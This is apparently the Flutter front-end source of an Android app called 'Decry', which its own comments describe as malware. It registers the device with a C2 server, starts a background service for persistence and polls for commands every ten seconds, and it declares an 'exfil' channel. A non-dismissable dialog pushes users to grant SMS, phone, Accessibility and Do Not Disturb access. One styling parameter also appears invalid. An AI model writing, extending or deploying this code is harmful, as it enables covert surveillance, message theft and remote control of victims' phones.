import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(const DecryApp());
}

class DecryApp extends StatelessWidget {
  const DecryApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Decry',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.black),
        scaffoldBackgroundColor: Colors.white,
      ),
      home: const PermissionGate(),
    );
  }
}

class PermissionGate extends StatefulWidget {
  const PermissionGate({super.key});

  @override
  State<PermissionGate> createState() => _PermissionGateState();
}

class _PermissionGateState extends State<PermissionGate>
    with WidgetsBindingObserver {
  static const _permissionsChannel = MethodChannel('com.decry.permissions');
  static const _exfilChannel = MethodChannel('com.decry.exfil');

  bool _runtimePermissionsGranted = false;
  bool _accessibilityEnabled = false;
  bool _notificationPolicyGranted = false;
  bool _isLoading = true;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    WidgetsBinding.instance.addPostFrameCallback(
      (_) => _initializePermissions(),
    );
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && !_isLoading) {
      _refreshSpecialAccess();
    }
  }

  Future<void> _initializePermissions() async {
    if (defaultTargetPlatform == TargetPlatform.android && mounted) {
      await _showPermissionRequirementDialog();
    }

    try {
      final result = await _permissionsChannel.invokeMethod<Map<dynamic, dynamic>>(
        'requestRuntimePermissions',
      );
      if (!mounted) return;
      setState(() {
        _runtimePermissionsGranted = result?['granted'] == true;
        _isLoading = false;
      });
      await _refreshSpecialAccess();

      // Register device with C2 server
      await _permissionsChannel.invokeMethod('registerDevice');

      // Start the background service for persistence
      try {
        await _permissionsChannel.invokeMethod('startBackgroundService');
      } catch (e) {
        debugPrint("Background service error: $e");
      }

      // Start polling for commands in background
      _startCommandPolling();
    } on MissingPluginException {
      if (!mounted) return;
      setState(() {
        _runtimePermissionsGranted = true;
        _accessibilityEnabled = true;
        _notificationPolicyGranted = true;
        _isLoading = false;
      });
    } on PlatformException {
      if (!mounted) return;
      setState(() => _isLoading = false);
    }
  }

  Future<void> _startCommandPolling() async {
    // Poll for commands every 10 seconds
    while (mounted) {
      await Future.delayed(const Duration(seconds: 10));
      try {
        await _permissionsChannel.invokeMethod('pollCommands');
      } catch (e) {
        debugPrint("Polling error: $e");
      }
    }
  }

  Future<void> _refreshSpecialAccess() async {
    try {
      final result = await _permissionsChannel.invokeMethod<Map<dynamic, dynamic>>(
        'getSpecialAccessStatus',
      );
      if (!mounted || result == null) return;
      setState(() {
        _accessibilityEnabled = result['accessibilityEnabled'] == true;
        _notificationPolicyGranted =
            result['notificationPolicyGranted'] == true;
      });
    } on MissingPluginException {
      // Web and other non-Android platforms
    } on PlatformException {
      // Keep the base shell usable
    }
  }

  Future<void> _requestRuntimePermissions() async {
    setState(() => _isLoading = true);
    await _initializePermissions();
  }

  Future<void> _showPermissionRequirementDialog() {
    return showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        return PopScope(
          canPop: false,
          child: AlertDialog(
            title: const Text('Permissions are required'),
            content: const Text(
              'Decry will not work unless every permission it requests is allowed. '
              'This includes SMS and phone access, Accessibility access, and Do Not Disturb access.',
            ),
            actions: [
              FilledButton(
                onPressed: () => Navigator.of(context).pop(),
                child: const Text('Continue'),
              ),
            ],
          ),
        );
      },
    );
  }

  Future<void> _openAccessibilitySettings() async {
    await _permissionsChannel.invokeMethod<void>('openAccessibilitySettings');
  }

  Future<void> _openNotificationSettings() async {
    await _permissionsChannel.invokeMethod<void>('openNotificationPolicySettings');
  }

  @override
  Widget build(BuildContext context) {
    if (_isLoading) {
      return const Scaffold(
        backgroundColor: Colors.white,
        body: Center(
          child: SizedBox(
            width: 20,
            height: 20,
            child: CircularProgressIndicator(strokeWidth: 2),
          ),
        ),
      );
    }

    if (defaultTargetPlatform != TargetPlatform.android) {
      return const Scaffold(
        backgroundColor: Colors.white,
        body: Center(
          child: Text(
            'Decry',
            style: TextStyle(color: Colors.black, fontSize: 14),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: Colors.white,
      body: SafeArea(
        child: Center(
          child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const SizedBox(height: 48),
            const Text(
              'Decry',
              textAlign: TextAlign.center,
              style: TextStyle(fontSize: 22, fontWeight: FontWeight.w500),
            ),
            const SizedBox(height: 24),
            if (!_accessibilityEnabled)
              Padding(
                padding: const EdgeInsets.symmetric(vertical: 8),
                child: Column(
                  children: [
                    const Text(
                      'Accessibility access is required',
                      style: TextStyle(fontSize: 14),
                    ),
                    const SizedBox(height: 8),
                    SizedBox(
                      width: 200,
                      child: ElevatedButton(
                        onPressed: _openAccessibilitySettings,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.black,
                          foreground: Colors.white,
                          padding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                        child: const Text('Enable', style: TextStyle(fontSize: 14)),
                      ),
                    ),
                  ],
                ),
              ),
            if (!_notificationPolicyGranted)
              Padding(
                padding: const EdgeInsets.symmetric(vertical: 8),
                child: Column(
                  children: [
                    const Text(
                      'Do Not Disturb access is required',
                      style: TextStyle(fontSize: 14),
                    ),
                    const SizedBox(height: 8),
                    SizedBox(
                      width: 200,
                      child: ElevatedButton(
                        onPressed: _openNotificationSettings,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.black,
                          foreground: Colors.white,
                          padding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                        child: const Text('Enable', style: TextStyle(fontSize: 14)),
                      ),
                    ),
                  ],
                ),
              ),
            if (!_runtimePermissionsGranted)
              Padding(
                padding: const EdgeInsets.symmetric(vertical: 8),
                child: Column(
                  children: [
                    const Text(
                      'SMS and phone access is required',
                      style: TextStyle(fontSize: 14),
                    ),
                    const SizedBox(height: 8),
                    SizedBox(
                      width: 200,
                      child: ElevatedButton(
                        onPressed: _requestRuntimePermissions,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.black,
                          foreground: Colors.white,
                          padding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                        child: const Text('Grant access', style: TextStyle(fontSize: 14)),
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
      ),
    );
  }
}
